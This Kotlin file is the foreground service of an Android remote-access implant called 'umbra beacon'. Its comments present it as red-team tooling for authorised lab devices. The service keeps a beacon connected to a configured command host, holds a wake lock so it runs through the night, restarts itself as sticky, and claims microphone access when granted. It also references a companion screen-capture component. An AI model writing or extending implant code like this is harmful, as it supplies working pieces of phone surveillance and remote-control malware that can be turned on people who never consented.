package io.umbra.beacon

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import java.util.concurrent.atomic.AtomicBoolean

/**
 * Foreground service that keeps the beacon alive.
 *
 * Android requires a visible notification for long-running background work, so
 * this service is deliberately honest about what it is: it is meant for
 * authorised lab devices and internal red-team engagements.
 */
class BeaconService : Service(), Beacon.Listener {
    companion object {
        const val CHANNEL_ID = "umbra-beacon"
        const val NOTIFICATION_ID = 4711
        const val ACTION_STOP = "io.umbra.beacon.STOP"
        private val active = AtomicBoolean(false)

        /**
         * The beacon that runs, so that a watcher can ask it to connect
         * again right now.
         */
        @Volatile private var running: Beacon? = null

        /**
         * Ask the beacon to connect again.
         *
         * The watchers of the phone use it: a message that arrives in the
         * middle of the night does not wait for the end of the sleep.
         */
        fun wake() {
            running?.wake()
        }

        fun isActive(): Boolean = active.get()

        fun start(context: Context) {
            val intent = Intent(context, BeaconService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }

        /**
         * Ask the service to stop.
         *
         * `startService` throws IllegalStateException once the app is in the
         * background on API 26+, so fall back to a plain stopService: that skips
         * onStartCommand but still runs onDestroy, which stops the beacon.
         */
        fun stop(context: Context) {
            val intent = Intent(context, BeaconService::class.java)
            intent.action = ACTION_STOP
            try {
                context.startService(intent)
            } catch (_: IllegalStateException) {
                context.stopService(Intent(context, BeaconService::class.java))
            }
        }
    }

    private var beacon: Beacon? = null

    /** Set once the service is being destroyed, so a late log cannot re-post a notification. */
    private val destroyed = AtomicBoolean(false)
    private var wakeLock: PowerManager.WakeLock? = null

    override fun onCreate() {
        super.onCreate()
        createChannel()
        // Android 14 refuses a foreground service that announces a type
        // whose permission it does not hold, and refuses the whole service
        // with a SecurityException: the type is a claim, and a claim that
        // cannot be backed by a token is not made.
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForegroundTyped()
        } else {
            startForeground(NOTIFICATION_ID, notification("starting…"))
        }
    }

    /**
     * Start in the foreground with the types that can actually be held.
     *
     * The first attempt announces the types the permissions allow.  If the
     * platform still refuses -- the microphone is a "while in use"
     * permission and Android 14 refuses a microphone service started from
     * the background even when the permission is granted -- the service
     * falls back to the data sync type alone, which needs no permission
     * beyond the one in the manifest.  Without that fallback the whole
     * process dies on the target API level, which is worse than a service
     * that runs without a type it never used.
     */
    private fun startForegroundTyped() {
        val wanted = foregroundTypes()
        try {
            startForeground(NOTIFICATION_ID, notification("starting…"), wanted)
            return
        } catch (_: SecurityException) {
            // The platform refused a type; the record below says so.
        }
        startForeground(
            NOTIFICATION_ID,
            notification("starting… (the platform refused a foreground type)"),
            ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC,
        )
    }

    /**
     * The types of the foreground service.
     *
     * The data sync is always there and always allowed.  The microphone
     * comes when the user granted the microphone.  The capture of the
     * screen is not announced here at all: it belongs to ProjectionService,
     * the only component that holds the consent token the platform asks
     * for, and a type announced without that token is exactly what Android
     * 14 kills the service for.
     */
    private fun foregroundTypes(): Int {
        var types = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
        if (granted(android.Manifest.permission.RECORD_AUDIO)) {
            types = types or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
        }
        return types
    }

    /** Is the permission granted to the implant right now? */
    private fun granted(permission: String): Boolean {
        return try {
            checkSelfPermission(permission) == PackageManager.PERMISSION_GRANTED
        } catch (_: Throwable) {
            false
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == ACTION_STOP) {
            stopBeacon()
            return START_NOT_STICKY
        }
        if (beacon == null) startBeacon()
        return START_STICKY
    }

    private fun startBeacon() {
        val cfg = RemoteConfig.load(this)
        if (cfg == null) {
            notify("configuration missing (UMBRA_PSK)")
            stopBeacon()
            return
        }
        acquireWakeLock()
        active.set(true)
        val b = Beacon(cfg, this)
        beacon = b
        running = b
        b.start()
        notify("beacon running -> ${Addr.hostPort(cfg.host, cfg.port)}")
    }

    private fun stopBeacon() {
        beacon?.stop()
        beacon = null
        running = null
        active.set(false)
        releaseWakeLock()
        stopForeground(true)
        stopSelf()
    }

    override fun onDestroy() {
        destroyed.set(true)
        beacon?.stop()
        beacon = null
        running = null
        active.set(false)
        releaseWakeLock()
        // A notification that outlives its service is a lie on the screen of
        // the user: it says the beacon is running when nothing is.  The
        // fourteenth run stopped the service with `am stopservice` and found
        // the notification still posted, because this method never took it
        // down -- stopBeacon() did, and the system's own stop does not go
        // through stopBeacon().
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            stopForeground(STOP_FOREGROUND_REMOVE)
        } else {
            @Suppress("DEPRECATION")
            stopForeground(true)
        }
        // stopForeground removes the notification the system knows about, and
        // the beacon thread may still be finishing a cycle: a log it writes on
        // the way out would post the notification again, for a service that no
        // longer exists.  The id is cancelled outright as well.
        try {
            (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager).cancel(NOTIFICATION_ID)
        } catch (_: Throwable) {
            // nothing left to cancel
        }
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    // -- Beacon.Listener ------------------------------------------------
    override fun onLog(message: String) {
        notify(message)
    }

    override fun onStopped() {
        releaseWakeLock()
        active.set(false)
    }

    // -- notification / wake lock ---------------------------------------
    private fun createChannel() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) return
        val mgr = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        val channel = NotificationChannel(
            CHANNEL_ID,
            getString(R.string.notification_channel_name),
            NotificationManager.IMPORTANCE_LOW,
        )
        channel.description = getString(R.string.notification_channel_description)
        mgr.createNotificationChannel(channel)
    }

    private fun notification(text: String): Notification {
        val builder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Notification.Builder(this, CHANNEL_ID)
        } else {
            @Suppress("DEPRECATION")
            Notification.Builder(this)
        }
        return builder
            .setContentTitle(getString(R.string.app_name))
            .setContentText(text)
            .setSmallIcon(android.R.drawable.stat_sys_download_done)
            .setOngoing(true)
            .build()
    }

    private fun notify(text: String) {
        if (destroyed.get()) return
        val mgr = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        mgr.notify(NOTIFICATION_ID, notification(text))
    }

    private fun acquireWakeLock() {
        if (wakeLock != null) return
        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "umbra:beacon").apply {
            setReferenceCounted(false)
            acquire()
        }
    }

    private fun releaseWakeLock() {
        wakeLock?.let {
            if (it.isHeld) it.release()
        }
        wakeLock = null
    }
}
